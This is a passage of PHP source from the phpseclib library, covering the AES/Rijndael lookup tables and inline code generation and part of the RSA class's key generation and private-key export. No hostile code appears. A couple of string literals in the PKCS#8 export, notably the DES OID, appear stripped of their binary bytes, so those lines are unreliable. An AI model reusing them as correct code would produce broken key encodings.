0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16));
        }
        return $tables;
    }
    function &_getInvTables() {
        static $tables;
        if (empty($tables)) {
            $dt3 = array_map('intval', array(0xF4A75051, 0x4165537E, 0x17A4C31A, 0x275E963A, 0xAB6BCB3B, 0x9D45F11F, 0xFA58ABAC, 0xE303934B, 0x30FA5520, 0x766DF6AD, 0xCC769188, 0x024C25F5, 0xE5D7FC4F, 0x2ACBD7C5, 0x35448026, 0x62A38FB5, 0xB15A49DE, 0xBA1B6725, 0xEA0E9845, 0xFEC0E15D, 0x2F7502C3, 0x4CF01281, 0x4697A38D, 0xD3F9C66B, 0x8F5FE703, 0x929C9515, 0x6D7AEBBF, 0x5259DA95, 0xBE832DD4, 0x7421D358, 0xE0692949, 0xC9C8448E, 0xC2896A75, 0x8E7978F4, 0x583E6B99, 0xB971DD27, 0xE14FB6BE, 0x88AD17F0, 0x20AC66C9, 0xCE3AB47D, 0xDF4A1863, 0x1A3182E5, 0x51336097, 0x537F4562, 0x6477E0B1, 0x6BAE84BB, 0x81A01CFE, 0x082B94F9, 0x48685870, 0x45FD198F, 0xDE6C8794, 0x7BF8B752, 0x73D323AB, 0x4B02E272, 0x1F8F57E3, 0x55AB2A66, 0xEB2807B2, 0xB5C2032F, 0xC57B9A86, 0x3708A5D3, 0x2887F230, 0xBFA5B223, 0x036ABA02, 0x16825CED, 0xCF1C2B8A, 0x79B492A7, 0x07F2F0F3, 0x69E2A14E, 0xDAF4CD65, 0x05BED506, 0x34621FD1, 0xA6FE8AC4, 0x2E539D34, 0xF355A0A2, 0x8AE13205, 0xF6EB75A4, 0x83EC390B, 0x60EFAA40, 0x719F065E, 0x6E1051BD, 0x218AF93E, 0xDD063D96, 0x3E05AEDD, 0xE6BD464D, 0x548DB591, 0xC45D0571, 0x06D46F04, 0x5015FF60, 0x98FB2419, 0xBDE997D6, 0x4043CC89, 0xD99E7767, 0xE842BDB0, 0x898B8807, 0x195B38E7, 0xC8EEDB79, 0x7C0A47A1, 0x420FE97C, 0x841EC9F8, 0x00000000, 0x80868309, 0x2BED4832, 0x1170AC1E, 0x5A724E6C, 0x0EFFFBFD, 0x8538560F, 0xAED51E3D, 0x2D392736, 0x0FD9640A, 0x5CA62168, 0x5B54D19B, 0x362E3A24, 0x0A67B10C, 0x57E70F93, 0xEE96D2B4, 0x9B919E1B, 0xC0C54F80, 0xDC20A261, 0x774B695A, 0x121A161C, 0x93BA0AE2, 0xA02AE5C0, 0x22E0433C, 0x1B171D12, 0x090D0B0E, 0x8BC7ADF2, 0xB6A8B92D, 0x1EA9C814, 0xF1198557, 0x75074CAF, 0x99DDBBEE, 0x7F60FDA3, 0x01269FF7, 0x72F5BC5C, 0x663BC544, 0xFB7E345B, 0x4329768B, 0x23C6DCCB, 0xEDFC68B6, 0xE4F163B8, 0x31DCCAD7, 0x63851042, 0x97224013, 0xC6112084, 0x4A247D85, 0xBB3DF8D2, 0xF93211AE, 0x29A16DC7, 0x9E2F4B1D, 0xB230F3DC, 0x8652EC0D, 0xC1E3D077, 0xB3166C2B, 0x70B999A9, 0x9448FA11, 0xE9642247, 0xFC8CC4A8, 0xF03F1AA0, 0x7D2CD856, 0x3390EF22, 0x494EC787, 0x38D1C1D9, 0xCAA2FE8C, 0xD40B3698, 0xF581CFA6, 0x7ADE28A5, 0xB78E26DA, 0xADBFA43F, 0x3A9DE42C, 0x78920D50, 0x5FCC9B6A, 0x7E466254, 0x8D13C2F6, 0xD8B8E890, 0x39F75E2E, 0xC3AFF582, 0x5D80BE9F, 0xD0937C69, 0xD52DA96F, 0x2512B3CF, 0xAC993BC8, 0x187DA710, 0x9C636EE8, 0x3BBB7BDB, 0x267809CD, 0x5918F46E, 0x9AB701EC, 0x4F9AA883, 0x956E65E6, 0xFFE67EAA, 0xBCCF0821, 0x15E8E6EF, 0xE79BD9BA, 0x6F36CE4A, 0x9F09D4EA, 0xB07CD629, 0xA4B2AF31, 0x3F23312A, 0xA59430C6, 0xA266C035, 0x4EBC3774, 0x82CAA6FC, 0x90D0B0E0, 0xA7D81533, 0x04984AF1, 0xECDAF741, 0xCD500E7F, 0x91F62F17, 0x4DD68D76, 0xEFB04D43, 0xAA4D54CC, 0x9604DFE4, 0xD1B5E39E, 0x6A881B4C, 0x2C1FB8C1, 0x65517F46, 0x5EEA049D, 0x8C355D01, 0x877473FA, 0x0B412EFB, 0x671D5AB3, 0xDBD25292, 0x105633E9, 0xD647136D, 0xD7618C9A, 0xA10C7A37, 0xF8148E59, 0x133C89EB, 0xA927EECE, 0x61C935B7, 0x1CE5EDE1, 0x47B13C7A, 0xD2DF599C, 0xF2733F55, 0x14CE7918, 0xC737BF73, 0xF7CDEA53, 0xFDAA5B5F, 0x3D6F14DF, 0x44DB8678, 0xAFF381CA, 0x68C43EB9, 0x24342C38, 0xA3405FC2, 0x1DC37216, 0xE2250CBC, 0x3C498B28, 0x0D9541FF, 0xA8017139, 0x0CB3DE08, 0xB4E49CD8, 0x56C19064, 0xCB84617B, 0x32B670D5, 0x6C5C7448, 0xB85742D0));
            foreach ($dt3 as $dt3i) {
                $dt0[] = (($dt3i << 24) & 0xFF000000) | (($dt3i >> 8) & 0x00FFFFFF);
                $dt1[] = (($dt3i << 16) & 0xFFFF0000) | (($dt3i >> 16) & 0x0000FFFF);
                $dt2[] = (($dt3i << 8) & 0xFFFFFF00) | (($dt3i >> 24) & 0x000000FF);
            };
            $tables = array($dt0, $dt1, $dt2, $dt3, array(0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D));
        }
        return $tables;
    }
    function _setupInlineCrypt() {
        $lambda_functions = & Crypt_Rijndael::_getLambdaFunctions();
        $gen_hi_opt_code = (bool)(count($lambda_functions) < 10);
        $code_hash = "Crypt_Rijndael, {$this->mode}, {$this->Nr}, {$this->Nb}";
        if ($gen_hi_opt_code) {
            $code_hash = str_pad($code_hash, 32) . $this->_hashInlineCryptFunction($this->key);
        }
        if (!isset($lambda_functions[$code_hash])) {
            switch (true) {
                case $gen_hi_opt_code:
                    $w = $this->w;
                    $dw = $this->dw;
                    $init_encrypt = '';
                    $init_decrypt = '';
                break;
                default:
                    for ($i = 0, $cw = count($this->w);$i < $cw;++$i) {
                        $w[] = '$w[' . $i . ']';
                        $dw[] = '$dw[' . $i . ']';
                    }
                    $init_encrypt = '$w = $self->w;';
                    $init_decrypt = '$dw = $self->dw;';
            }
            $Nr = $this->Nr;
            $Nb = $this->Nb;
            $c = $this->c;
            $init_encrypt.= ' static $tables; if (empty($tables)) { $tables = &$self->_getTables(); } $t0 = $tables[0]; $t1 = $tables[1]; $t2 = $tables[2]; $t3 = $tables[3]; $sbox = $tables[4]; ';
            $s = 'e';
            $e = 's';
            $wc = $Nb - 1;
            $encrypt_block = '$in = unpack("N*", $in);' . "
";
            for ($i = 0;$i < $Nb;++$i) {
                $encrypt_block.= '$s' . $i . ' = $in[' . ($i + 1) . '] ^ ' . $w[++$wc] . ";
";
            }
            for ($round = 1;$round < $Nr;++$round) {
                list($s, $e) = array($e, $s);
                for ($i = 0;$i < $Nb;++$i) {
                    $encrypt_block.= '$' . $e . $i . ' = $t0[($' . $s . $i . ' >> 24) & 0xff] ^ $t1[($' . $s . (($i + $c[1]) % $Nb) . ' >> 16) & 0xff] ^ $t2[($' . $s . (($i + $c[2]) % $Nb) . ' >> 8) & 0xff] ^ $t3[ $' . $s . (($i + $c[3]) % $Nb) . ' & 0xff] ^ ' . $w[++$wc] . ";
";
                }
            }
            for ($i = 0;$i < $Nb;++$i) {
                $encrypt_block.= '$' . $e . $i . ' = $sbox[ $' . $e . $i . ' & 0xff] | ($sbox[($' . $e . $i . ' >> 8) & 0xff] << 8) | ($sbox[($' . $e . $i . ' >> 16) & 0xff] << 16) | ($sbox[($' . $e . $i . ' >> 24) & 0xff] << 24);' . "
";
            }
            $encrypt_block.= '$in = pack("N*"' . "
";
            for ($i = 0;$i < $Nb;++$i) {
                $encrypt_block.= ', ($' . $e . $i . ' & ' . ((int)0xFF000000) . ') ^ ($' . $e . (($i + $c[1]) % $Nb) . ' & 0x00FF0000 ) ^ ($' . $e . (($i + $c[2]) % $Nb) . ' & 0x0000FF00 ) ^ ($' . $e . (($i + $c[3]) % $Nb) . ' & 0x000000FF ) ^ ' . $w[$i] . "
";
            }
            $encrypt_block.= ');';
            $init_decrypt.= ' static $invtables; if (empty($invtables)) { $invtables = &$self->_getInvTables(); } $dt0 = $invtables[0]; $dt1 = $invtables[1]; $dt2 = $invtables[2]; $dt3 = $invtables[3]; $isbox = $invtables[4]; ';
            $s = 'e';
            $e = 's';
            $wc = $Nb - 1;
            $decrypt_block = '$in = unpack("N*", $in);' . "
";
            for ($i = 0;$i < $Nb;++$i) {
                $decrypt_block.= '$s' . $i . ' = $in[' . ($i + 1) . '] ^ ' . $dw[++$wc] . ';' . "
";
            }
            for ($round = 1;$round < $Nr;++$round) {
                list($s, $e) = array($e, $s);
                for ($i = 0;$i < $Nb;++$i) {
                    $decrypt_block.= '$' . $e . $i . ' = $dt0[($' . $s . $i . ' >> 24) & 0xff] ^ $dt1[($' . $s . (($Nb + $i - $c[1]) % $Nb) . ' >> 16) & 0xff] ^ $dt2[($' . $s . (($Nb + $i - $c[2]) % $Nb) . ' >> 8) & 0xff] ^ $dt3[ $' . $s . (($Nb + $i - $c[3]) % $Nb) . ' & 0xff] ^ ' . $dw[++$wc] . ";
";
                }
            }
            for ($i = 0;$i < $Nb;++$i) {
                $decrypt_block.= '$' . $e . $i . ' = $isbox[ $' . $e . $i . ' & 0xff] | ($isbox[($' . $e . $i . ' >> 8) & 0xff] << 8) | ($isbox[($' . $e . $i . ' >> 16) & 0xff] << 16) | ($isbox[($' . $e . $i . ' >> 24) & 0xff] << 24);' . "
";
            }
            $decrypt_block.= '$in = pack("N*"' . "
";
            for ($i = 0;$i < $Nb;++$i) {
                $decrypt_block.= ', ($' . $e . $i . ' & ' . ((int)0xFF000000) . ') ^ ($' . $e . (($Nb + $i - $c[1]) % $Nb) . ' & 0x00FF0000 ) ^ ($' . $e . (($Nb + $i - $c[2]) % $Nb) . ' & 0x0000FF00 ) ^ ($' . $e . (($Nb + $i - $c[3]) % $Nb) . ' & 0x000000FF ) ^ ' . $dw[$i] . "
";
            }
            $decrypt_block.= ');';
            $lambda_functions[$code_hash] = $this->_createInlineCryptFunction(array('init_crypt' => '', 'init_encrypt' => $init_encrypt, 'init_decrypt' => $init_decrypt, 'encrypt_block' => $encrypt_block, 'decrypt_block' => $decrypt_block));
        }
        $this->inline_crypt = $lambda_functions[$code_hash];
    }
}
define('CRYPT_AES_MODE_CTR', CRYPT_MODE_CTR);
define('CRYPT_AES_MODE_ECB', CRYPT_MODE_ECB);
define('CRYPT_AES_MODE_CBC', CRYPT_MODE_CBC);
define('CRYPT_AES_MODE_CFB', CRYPT_MODE_CFB);
define('CRYPT_AES_MODE_OFB', CRYPT_MODE_OFB);
class Crypt_AES extends Crypt_Rijndael {
    var $const_namespace = 'AES';
    function setBlockLength($length) {
        return;
    }
    function setKeyLength($length) {
        switch ($length) {
            case 160:
                $length = 192;
            break;
            case 224:
                $length = 256;
        }
        parent::setKeyLength($length);
    }
    function setKey($key) {
        parent::setKey($key);
        if (!$this->explicit_key_length) {
            $length = strlen($key);
            switch (true) {
                case $length <= 16:
                    $this->key_length = 16;
                break;
                case $length <= 24:
                    $this->key_length = 24;
                break;
                default:
                    $this->key_length = 32;
            }
            $this->_setEngine();
        }
    }
}
if (!function_exists('crypt_random_string')) {
    include_once 'Random.php';
}
if (!class_exists('Crypt_Hash')) {
    include_once 'Hash.php';
}
define('CRYPT_RSA_ENCRYPTION_OAEP', 1);
define('CRYPT_RSA_ENCRYPTION_PKCS1', 2);
define('CRYPT_RSA_ENCRYPTION_NONE', 3);
define('CRYPT_RSA_SIGNATURE_PSS', 1);
define('CRYPT_RSA_SIGNATURE_PKCS1', 2);
define('CRYPT_RSA_ASN1_INTEGER', 2);
define('CRYPT_RSA_ASN1_BITSTRING', 3);
define('CRYPT_RSA_ASN1_OCTETSTRING', 4);
define('CRYPT_RSA_ASN1_OBJECT', 6);
define('CRYPT_RSA_ASN1_SEQUENCE', 48);
define('CRYPT_RSA_MODE_INTERNAL', 1);
define('CRYPT_RSA_MODE_OPENSSL', 2);
define('CRYPT_RSA_OPENSSL_CONFIG', dirname(__FILE__) . '/../openssl.cnf');
define('CRYPT_RSA_PRIVATE_FORMAT_PKCS1', 0);
define('CRYPT_RSA_PRIVATE_FORMAT_PUTTY', 1);
define('CRYPT_RSA_PRIVATE_FORMAT_XML', 2);
define('CRYPT_RSA_PRIVATE_FORMAT_PKCS8', 8);
define('CRYPT_RSA_PUBLIC_FORMAT_RAW', 3);
define('CRYPT_RSA_PUBLIC_FORMAT_PKCS1', 4);
define('CRYPT_RSA_PUBLIC_FORMAT_PKCS1_RAW', 4);
define('CRYPT_RSA_PUBLIC_FORMAT_XML', 5);
define('CRYPT_RSA_PUBLIC_FORMAT_OPENSSH', 6);
define('CRYPT_RSA_PUBLIC_FORMAT_PKCS8', 7);
class Crypt_RSA {
    var $zero;
    var $one;
    var $privateKeyFormat = CRYPT_RSA_PRIVATE_FORMAT_PKCS1;
    var $publicKeyFormat = CRYPT_RSA_PUBLIC_FORMAT_PKCS8;
    var $modulus;
    var $k;
    var $exponent;
    var $primes;
    var $exponents;
    var $coefficients;
    var $hashName;
    var $hash;
    var $hLen;
    var $sLen;
    var $mgfHash;
    var $mgfHLen;
    var $encryptionMode = CRYPT_RSA_ENCRYPTION_OAEP;
    var $signatureMode = CRYPT_RSA_SIGNATURE_PSS;
    var $publicExponent = false;
    var $password = false;
    var $components = array();
    var $current;
    var $configFile;
    var $comment = 'phpseclib-generated-key';
    function __construct() {
        if (!class_exists('Math_BigInteger')) {
            include_once 'Math/BigInteger.php';
        }
        $this->configFile = CRYPT_RSA_OPENSSL_CONFIG;
        if (!defined('CRYPT_RSA_MODE')) {
            switch (true) {
                case defined('MATH_BIGINTEGER_OPENSSL_DISABLE'):
                    define('CRYPT_RSA_MODE', CRYPT_RSA_MODE_INTERNAL);
                break;
                case !function_exists('openssl_pkey_get_details'):
                    define('CRYPT_RSA_MODE', CRYPT_RSA_MODE_INTERNAL);
                break;
                case extension_loaded('openssl') && version_compare(PHP_VERSION, '4.2.0', '>=') && file_exists($this->configFile):
                    ob_start();
                    @phpinfo();
                    $content = ob_get_contents();
                    ob_end_clean();
                    preg_match_all('#OpenSSL (Header|Library) Version(.*)#im', $content, $matches);
                    $versions = array();
                    if (!empty($matches[1])) {
                        for ($i = 0;$i < count($matches[1]);$i++) {
                            $fullVersion = trim(str_replace('=>', '', strip_tags($matches[2][$i])));
                            if (!preg_match('/(\d+\.\d+\.\d+)/i', $fullVersion, $m)) {
                                $versions[$matches[1][$i]] = $fullVersion;
                            } else {
                                $versions[$matches[1][$i]] = $m[0];
                            }
                        }
                    }
                    switch (true) {
                        case !isset($versions['Header']):
                        case !isset($versions['Library']):
                        case $versions['Header'] == $versions['Library']:
                        case version_compare($versions['Header'], '1.0.0') >= 0 && version_compare($versions['Library'], '1.0.0') >= 0:
                            define('CRYPT_RSA_MODE', CRYPT_RSA_MODE_OPENSSL);
                        break;
                        default:
                            define('CRYPT_RSA_MODE', CRYPT_RSA_MODE_INTERNAL);
                            define('MATH_BIGINTEGER_OPENSSL_DISABLE', true);
                    }
                break;
                default:
                    define('CRYPT_RSA_MODE', CRYPT_RSA_MODE_INTERNAL);
            }
        }
        $this->zero = new Math_BigInteger();
        $this->one = new Math_BigInteger(1);
        $this->hash = new Crypt_Hash('sha1');
        $this->hLen = $this->hash->getLength();
        $this->hashName = 'sha1';
        $this->mgfHash = new Crypt_Hash('sha1');
        $this->mgfHLen = $this->mgfHash->getLength();
    }
    function Crypt_RSA() {
        $this->__construct();
    }
    function createKey($bits = 1024, $timeout = false, $partial = array()) {
        if (!defined('CRYPT_RSA_EXPONENT')) {
            define('CRYPT_RSA_EXPONENT', '65537');
        }
        if (!defined('CRYPT_RSA_SMALLEST_PRIME')) {
            define('CRYPT_RSA_SMALLEST_PRIME', 4096);
        }
        if (CRYPT_RSA_MODE == CRYPT_RSA_MODE_OPENSSL && $bits >= 384 && CRYPT_RSA_EXPONENT == 65537) {
            $config = array();
            if (isset($this->configFile)) {
                $config['config'] = $this->configFile;
            }
            $rsa = openssl_pkey_new(array('private_key_bits' => $bits) + $config);
            openssl_pkey_export($rsa, $privatekey, null, $config);
            $publickey = openssl_pkey_get_details($rsa);
            $publickey = $publickey['key'];
            $privatekey = call_user_func_array(array($this, '_convertPrivateKey'), array_values($this->_parseKey($privatekey, CRYPT_RSA_PRIVATE_FORMAT_PKCS1)));
            $publickey = call_user_func_array(array($this, '_convertPublicKey'), array_values($this->_parseKey($publickey, CRYPT_RSA_PUBLIC_FORMAT_PKCS1)));
            while (openssl_error_string() !== false) {
            }
            return array('privatekey' => $privatekey, 'publickey' => $publickey, 'partialkey' => false);
        }
        static $e;
        if (!isset($e)) {
            $e = new Math_BigInteger(CRYPT_RSA_EXPONENT);
        }
        extract($this->_generateMinMax($bits));
        $absoluteMin = $min;
        $temp = $bits >> 1;
        if ($temp > CRYPT_RSA_SMALLEST_PRIME) {
            $num_primes = floor($bits / CRYPT_RSA_SMALLEST_PRIME);
            $temp = CRYPT_RSA_SMALLEST_PRIME;
        } else {
            $num_primes = 2;
        }
        extract($this->_generateMinMax($temp + $bits % $temp));
        $finalMax = $max;
        extract($this->_generateMinMax($temp));
        $generator = new Math_BigInteger();
        $n = $this->one->copy();
        if (!empty($partial)) {
            extract(unserialize($partial));
        } else {
            $exponents = $coefficients = $primes = array();
            $lcm = array('top' => $this->one->copy(), 'bottom' => false);
        }
        $start = time();
        $i0 = count($primes) + 1;
        do {
            for ($i = $i0;$i <= $num_primes;$i++) {
                if ($timeout !== false) {
                    $timeout-= time() - $start;
                    $start = time();
                    if ($timeout <= 0) {
                        return array('privatekey' => '', 'publickey' => '', 'partialkey' => serialize(array('primes' => $primes, 'coefficients' => $coefficients, 'lcm' => $lcm, 'exponents' => $exponents)));
                    }
                }
                if ($i == $num_primes) {
                    list($min, $temp) = $absoluteMin->divide($n);
                    if (!$temp->equals($this->zero)) {
                        $min = $min->add($this->one);
                    }
                    $primes[$i] = $generator->randomPrime($min, $finalMax, $timeout);
                } else {
                    $primes[$i] = $generator->randomPrime($min, $max, $timeout);
                }
                if ($primes[$i] === false) {
                    if (count($primes) > 1) {
                        $partialkey = '';
                    } else {
                        array_pop($primes);
                        $partialkey = serialize(array('primes' => $primes, 'coefficients' => $coefficients, 'lcm' => $lcm, 'exponents' => $exponents));
                    }
                    return array('privatekey' => '', 'publickey' => '', 'partialkey' => $partialkey);
                }
                if ($i > 2) {
                    $coefficients[$i] = $n->modInverse($primes[$i]);
                }
                $n = $n->multiply($primes[$i]);
                $temp = $primes[$i]->subtract($this->one);
                $lcm['top'] = $lcm['top']->multiply($temp);
                $lcm['bottom'] = $lcm['bottom'] === false ? $temp : $lcm['bottom']->gcd($temp);
                $exponents[$i] = $e->modInverse($temp);
            }
            list($temp) = $lcm['top']->divide($lcm['bottom']);
            $gcd = $temp->gcd($e);
            $i0 = 1;
        } while (!$gcd->equals($this->one));
        $d = $e->modInverse($temp);
        $coefficients[2] = $primes[2]->modInverse($primes[1]);
        return array('privatekey' => $this->_convertPrivateKey($n, $e, $d, $primes, $exponents, $coefficients), 'publickey' => $this->_convertPublicKey($n, $e), 'partialkey' => false);
    }
    function _convertPrivateKey($n, $e, $d, $primes, $exponents, $coefficients) {
        $signed = $this->privateKeyFormat != CRYPT_RSA_PRIVATE_FORMAT_XML;
        $num_primes = count($primes);
        $raw = array('version' => $num_primes == 2 ? chr(0) : chr(1), 'modulus' => $n->toBytes($signed), 'publicExponent' => $e->toBytes($signed), 'privateExponent' => $d->toBytes($signed), 'prime1' => $primes[1]->toBytes($signed), 'prime2' => $primes[2]->toBytes($signed), 'exponent1' => $exponents[1]->toBytes($signed), 'exponent2' => $exponents[2]->toBytes($signed), 'coefficient' => $coefficients[2]->toBytes($signed));
        switch ($this->privateKeyFormat) {
            case CRYPT_RSA_PRIVATE_FORMAT_XML:
                if ($num_primes != 2) {
                    return false;
                }
                return "<RSAKeyValue>
" . ' <Modulus>' . base64_encode($raw['modulus']) . "</Modulus>
" . ' <Exponent>' . base64_encode($raw['publicExponent']) . "</Exponent>
" . ' <P>' . base64_encode($raw['prime1']) . "</P>
" . ' <Q>' . base64_encode($raw['prime2']) . "</Q>
" . ' <DP>' . base64_encode($raw['exponent1']) . "</DP>
" . ' <DQ>' . base64_encode($raw['exponent2']) . "</DQ>
" . ' <InverseQ>' . base64_encode($raw['coefficient']) . "</InverseQ>
" . ' <D>' . base64_encode($raw['privateExponent']) . "</D>
" . '</RSAKeyValue>';
            break;
            case CRYPT_RSA_PRIVATE_FORMAT_PUTTY:
                if ($num_primes != 2) {
                    return false;
                }
                $key = "PuTTY-User-Key-File-2: ssh-rsa
Encryption: ";
                $encryption = (!empty($this->password) || is_string($this->password)) ? 'aes256-cbc' : 'none';
                $key.= $encryption;
                $key.= "
Comment: " . $this->comment . "
";
                $public = pack('Na*Na*Na*', strlen('ssh-rsa'), 'ssh-rsa', strlen($raw['publicExponent']), $raw['publicExponent'], strlen($raw['modulus']), $raw['modulus']);
                $source = pack('Na*Na*Na*Na*', strlen('ssh-rsa'), 'ssh-rsa', strlen($encryption), $encryption, strlen($this->comment), $this->comment, strlen($public), $public);
                $public = base64_encode($public);
                $key.= "Public-Lines: " . ((strlen($public) + 63) >> 6) . "
";
                $key.= chunk_split($public, 64);
                $private = pack('Na*Na*Na*Na*', strlen($raw['privateExponent']), $raw['privateExponent'], strlen($raw['prime1']), $raw['prime1'], strlen($raw['prime2']), $raw['prime2'], strlen($raw['coefficient']), $raw['coefficient']);
                if (empty($this->password) && !is_string($this->password)) {
                    $source.= pack('Na*', strlen($private), $private);
                    $hashkey = 'putty-private-key-file-mac-key';
                } else {
                    $private.= crypt_random_string(16 - (strlen($private) & 15));
                    $source.= pack('Na*', strlen($private), $private);
                    if (!class_exists('Crypt_AES')) {
                        include_once 'Crypt/AES.php';
                    }
                    $sequence = 0;
                    $symkey = '';
                    while (strlen($symkey) < 32) {
                        $temp = pack('Na*', $sequence++, $this->password);
                        $symkey.= pack('H*', sha1($temp));
                    }
                    $symkey = substr($symkey, 0, 32);
                    $crypto = new Crypt_AES();
                    $crypto->setKey($symkey);
                    $crypto->disablePadding();
                    $private = $crypto->encrypt($private);
                    $hashkey = 'putty-private-key-file-mac-key' . $this->password;
                }
                $private = base64_encode($private);
                $key.= 'Private-Lines: ' . ((strlen($private) + 63) >> 6) . "
";
                $key.= chunk_split($private, 64);
                if (!class_exists('Crypt_Hash')) {
                    include_once 'Crypt/Hash.php';
                }
                $hash = new Crypt_Hash('sha1');
                $hash->setKey(pack('H*', sha1($hashkey)));
                $key.= 'Private-MAC: ' . bin2hex($hash->hash($source)) . "
";
                return $key;
            default:
                $components = array();
                foreach ($raw as $name => $value) {
                    $components[$name] = pack('Ca*a*', CRYPT_RSA_ASN1_INTEGER, $this->_encodeLength(strlen($value)), $value);
                }
                $RSAPrivateKey = implode('', $components);
                if ($num_primes > 2) {
                    $OtherPrimeInfos = '';
                    for ($i = 3;$i <= $num_primes;$i++) {
                        $OtherPrimeInfo = pack('Ca*a*', CRYPT_RSA_ASN1_INTEGER, $this->_encodeLength(strlen($primes[$i]->toBytes(true))), $primes[$i]->toBytes(true));
                        $OtherPrimeInfo.= pack('Ca*a*', CRYPT_RSA_ASN1_INTEGER, $this->_encodeLength(strlen($exponents[$i]->toBytes(true))), $exponents[$i]->toBytes(true));
                        $OtherPrimeInfo.= pack('Ca*a*', CRYPT_RSA_ASN1_INTEGER, $this->_encodeLength(strlen($coefficients[$i]->toBytes(true))), $coefficients[$i]->toBytes(true));
                        $OtherPrimeInfos.= pack('Ca*a*', CRYPT_RSA_ASN1_SEQUENCE, $this->_encodeLength(strlen($OtherPrimeInfo)), $OtherPrimeInfo);
                    }
                    $RSAPrivateKey.= pack('Ca*a*', CRYPT_RSA_ASN1_SEQUENCE, $this->_encodeLength(strlen($OtherPrimeInfos)), $OtherPrimeInfos);
                }
                $RSAPrivateKey = pack('Ca*a*', CRYPT_RSA_ASN1_SEQUENCE, $this->_encodeLength(strlen($RSAPrivateKey)), $RSAPrivateKey);
                if ($this->privateKeyFormat == CRYPT_RSA_PRIVATE_FORMAT_PKCS8) {
                    $rsaOID = pack('H*', '300d06092a864886f70d0101010500');
                    $RSAPrivateKey = pack('Ca*a*Ca*a*', CRYPT_RSA_ASN1_INTEGER, "", $rsaOID, 4, $this->_encodeLength(strlen($RSAPrivateKey)), $RSAPrivateKey);
                    $RSAPrivateKey = pack('Ca*a*', CRYPT_RSA_ASN1_SEQUENCE, $this->_encodeLength(strlen($RSAPrivateKey)), $RSAPrivateKey);
                    if (!empty($this->password) || is_string($this->password)) {
                        $salt = crypt_random_string(8);
                        $iterationCount = 2048;
                        if (!class_exists('Crypt_DES')) {
                            include_once 'Crypt/DES.php';
                        }
                        $crypto = new Crypt_DES();
                        $crypto->setPassword($this->password, 'pbkdf1', 'md5', $salt, $iterationCount);
                        $RSAPrivateKey = $crypto->encrypt($RSAPrivateKey);
                        $parameters = pack('Ca*a*Ca*N', CRYPT_RSA_ASN1_OCTETSTRING, $this->_encodeLength(strlen($salt)), $salt, CRYPT_RSA_ASN1_INTEGER, $this->_encodeLength(4), $iterationCount);
                        $pbeWithMD5AndDES_CBC = "*H
";
                        $encryptionAlgorithm = pack('Ca*a*Ca*a*', CRYPT_RSA_ASN1_OBJECT, $this->_encodeLength(strlen($pbeWithMD5AndDES_CBC)), $pbeWithMD5AndDES_CBC, CRYPT_RSA_ASN1_SEQUENCE, $this->_encodeLength(strlen($parameters)), $parameters);
                        $RSAPrivateKey = pack('Ca*a*Ca*a*', CRYPT_RSA_ASN1_SEQUENCE, $this->_encodeLength(strlen($encryptionAlgorithm)), $encryptionAlgorithm, CRYPT_RSA_ASN1_OCTETSTRING, $this->_encodeLength(strlen($RSAPrivateKey)), $RSAPrivateKey);
